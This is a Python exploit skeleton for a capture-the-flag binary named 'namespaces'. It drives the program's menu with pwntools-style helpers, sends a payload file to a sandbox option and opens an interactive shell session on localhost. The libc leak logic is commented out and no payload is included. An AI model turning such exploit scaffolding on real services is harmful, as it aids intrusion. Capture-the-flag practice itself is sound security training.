#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './namespaces'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'localhost', 'port':1337})
env.select('remote')

#==========

binf = ELF(bin_file)
'''
addr_plt_puts       = binf.plt['puts']
addr_got_main       = binf.got['__libc_start_main']
addr_bss            = binf.sep_section['.bss']
addr_main           = binf.sep_function['main']
'''

libc = binf.libc
'''
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10
'''

#==========

def attack(conn):
    ns = Namespace(conn)

    ns.start(open('./x', 'rb').read())
    raw_input('>')
    ns.run(0, open('./x', 'rb').read())
    raw_input('>')
    '''
    conn.recvuntil('> ')
    conn.sendline('hoge')

    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    '''
    
class Namespace:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def start(self, data):
        self.sendlineafter('> ', '1')
        self.sendlineafter('len? ', str(len(data)))
        self.sendafter('data? ', data)

    def run(self, sandbox, data):
        self.sendlineafter('> ', '2')
        self.sendlineafter('sandbox? ', str(sandbox))
        self.sendlineafter('len? ', str(len(data)))
        self.sendafter('data? ', data)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
